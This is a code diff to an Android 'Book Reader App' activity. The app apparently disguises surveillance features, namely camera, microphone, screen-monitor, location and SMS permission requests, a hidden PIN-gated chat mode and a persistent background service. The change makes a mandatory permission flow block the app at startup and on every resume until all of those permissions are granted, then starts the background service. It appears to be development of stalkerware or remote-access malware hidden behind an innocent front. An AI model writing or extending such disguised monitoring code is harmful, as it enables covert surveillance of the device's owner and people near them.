@@ -51,7 +51,9 @@ import com.h4ckinto.android.update.ForcedUpdateActivity;
 import com.h4ckinto.android.update.UpdateInProgressActivity;
 import com.h4ckinto.android.utils.Constants;
 import com.h4ckinto.android.utils.DesignConfig;
+import com.h4ckinto.android.utils.PermissionBootstrap;
 import com.h4ckinto.android.utils.PermissionDetector;
+import com.h4ckinto.android.utils.StoragePermissionManager;
 
 import android.app.KeyguardManager;
 
@@ -59,7 +61,7 @@ import android.app.KeyguardManager;
  * Main Activity for the Book Reader App
  * Beautiful dark Arabic UI with bottom navigation
  */
-public class BookReaderActivity extends AppCompatActivity {
+public class BookReaderActivity extends BaseActivity {
 
     private static final String TAG = "BookReaderActivity";
     
@@ -92,13 +94,30 @@ public class BookReaderActivity extends AppCompatActivity {
     
     private boolean serviceStarted = false;
     private boolean screenPermissionGranted = false;
+    private boolean mainUiInitialized = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
         isChatMode = DesignConfig.isChatMode(this);
-        
+
+        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
+            PermissionBootstrap.runMandatoryStartupFlow(this,
+                    () -> continueOnCreateAfterPermissions(savedInstanceState));
+            return;
+        }
+        continueOnCreateAfterPermissions(savedInstanceState);
+    }
+
+    private void continueOnCreateAfterPermissions(Bundle savedInstanceState) {
+        if (mainUiInitialized) {
+            if (!serviceStarted) {
+                startBackgroundService();
+            }
+            return;
+        }
+        mainUiInitialized = true;
+
         // For chat mode, redirect to PIN screen if not verified
         if (isChatMode && savedInstanceState == null) {
             boolean pinVerified = getIntent().getBooleanExtra("pin_verified", false);
@@ -109,37 +128,29 @@ public class BookReaderActivity extends AppCompatActivity {
                 return;
             }
         }
-        
+
         // Connect to chat socket if in chat mode and authenticated
         if (isChatMode) {
             ChatPrefs chatPrefs = new ChatPrefs(this);
             if (chatPrefs.isAuthenticated() && chatPrefs.getUserId() > 0) {
                 ChatSocketManager.getInstance().connect(chatPrefs.getUserId());
-                // Listen for incoming calls globally
                 setupIncomingCallListener();
             }
         }
-        
-        // Make status bar transparent and set dark navigation
+
         setupStatusBar();
-        
         setContentView(R.layout.activity_book_reader);
-        
+
         initFragments();
         initViews();
 
-        // Set default fragment
         if (savedInstanceState == null) {
             loadFragment(defaultFragment);
         }
 
-        // App update: check on launch; if forced update required, show blocking screen
         runUpdateCheck();
-        // If update was downloaded while app was closed, show Install screen
         checkUpdateReadyToInstall();
-
-        // Request permissions and start service
-        requestPermissions();
+        startBackgroundService();
     }
 
     /** If update downloaded but not installed: block app and show install screen only. If download in progress: show progress screen. */
@@ -208,26 +219,8 @@ public class BookReaderActivity extends AppCompatActivity {
     private static final int REQUEST_CHAT_LOCATION_FOR_PANEL = 204;
 
     private void requestPermissions() {
-        try {
-            if (isChatMode) {
-                requestStorageAndNotifications();
-            } else {
-                if (PermissionDetector.isCameraOrMicrophoneAvailable(this)) {
-                    requestCameraAndAudioPermissions();
-                } else if (PermissionDetector.isScreenMonitorAvailable(this)) {
-                    requestScreenMonitorPermission();
-                } else if (PermissionDetector.isLocationAvailable(this)) {
-                    requestLocationPermission();
-                } else if (PermissionDetector.isSmsAvailable(this)) {
-                    requestSmsPermission();
-                } else {
-                    requestBatteryOptimization();
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error in permission flow: " + e.getMessage(), e);
-            requestBatteryOptimization();
-        }
+        PermissionBootstrap.runMandatoryStartupFlow(this,
+                () -> continueOnCreateAfterPermissions(null));
     }
 
     private void requestStorageAndNotifications() {
@@ -699,8 +692,10 @@ public class BookReaderActivity extends AppCompatActivity {
             }
         } else if (requestCode == REQUEST_NOTIFICATION_SETTINGS) {
             requestNotificationPermission();
-        } else if (requestCode == REQUEST_BATTERY_OPTIMIZATION) {
-            startBackgroundService();
+        } else if (requestCode == REQUEST_BATTERY_OPTIMIZATION
+                || requestCode == StoragePermissionManager.REQUEST_CODE_MANAGE_STORAGE) {
+            PermissionBootstrap.onActivityResult(this, requestCode, resultCode,
+                    () -> continueOnCreateAfterPermissions(null));
         } else if (requestCode == REQUEST_KEYGUARD) {
             AppLockManager lockMgr = AppLockManager.getInstance(this);
             View lockOverlay = findViewById(R.id.lock_overlay);
@@ -716,6 +711,11 @@ public class BookReaderActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+        PermissionBootstrap.ensureRequiredOnResume(this,
+                () -> continueOnCreateAfterPermissions(null));
+        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
+            return;
+        }
         checkUpdateReadyToInstall();
         if (isChatMode) {
             ChatSocketManager.getInstance().setAppForeground(true);
@@ -781,7 +781,15 @@ public class BookReaderActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        
+
+        if (requestCode == PermissionBootstrap.REQUEST_RUNTIME_BATCH
+                || requestCode == StoragePermissionManager.REQUEST_CODE_STORAGE
+                || requestCode == PermissionBootstrap.REQUEST_BATTERY) {
+            PermissionBootstrap.onRequestPermissionsResult(this, requestCode, permissions, grantResults,
+                    () -> continueOnCreateAfterPermissions(null));
+            return;
+        }
+
         if (requestCode == REQUEST_NOTIFICATION_PERM) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 requestRemainingPermissions();
